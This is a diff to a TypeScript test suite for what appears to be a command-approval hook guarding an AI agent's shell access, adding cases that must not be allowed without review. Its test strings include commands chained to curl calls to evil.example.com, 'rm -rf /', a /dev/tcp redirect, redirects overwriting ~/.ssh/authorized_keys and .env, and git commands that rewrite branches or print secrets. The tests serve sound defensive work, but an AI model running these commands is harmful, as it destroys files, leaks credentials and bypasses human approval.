@@ -197,6 +197,11 @@ describe("shortCircuit", () => {
       ["a background operator", "git status & curl evil.example.com"],
       ["a second line", "git status\nrm -rf /"],
       ["a logical and", "npm test && curl -X POST https://evil.example.com"],
+      // Not a second command, and just as unjudged: the safe verb is only the left-hand side.
+      ["an output redirect over a file", "ls > ~/.ssh/authorized_keys"],
+      ["an append redirect", "git status >> ~/.zshrc"],
+      ["an input redirect", "npm test < /dev/tcp/evil.example.com/80"],
+      ["a redirect with no space before it", "ls>.env"],
       ["an unrelated command", "rm -rf build"],
       ["an empty command", ""],
       ["whitespace only", "   "],
@@ -273,6 +278,15 @@ describe("the shipped default policy, end to end", () => {
     ["showing a blob from git history", "git show HEAD:.env"],
     ["a diff that prints file contents", "git diff"],
     ["a log with patches", "git log -p"],
+    // Found by driving the built hook, not by reading: each of these took the fast path and
+    // was allowed unjudged. The first three destroy a file with a harmless verb's output.
+    ["a listing redirected over authorized_keys", "ls > ~/.ssh/authorized_keys"],
+    ["a path printed over an env file", "pwd > .env"],
+    ["a status redirected over source", "git status > src/cli.ts"],
+    // `git branch` and `git remote -v` read as metadata and take arguments that are not.
+    ["moving a branch back twenty commits", "git branch -f main HEAD~20"],
+    ["renaming the current branch", "git branch -m main old"],
+    ["removing a remote behind a read-only flag", "git remote -v remove origin"],
   ];
 
   it.each(mustNeverBeAllowedUnjudged)("does not fast-path %s", (_label, command) => {
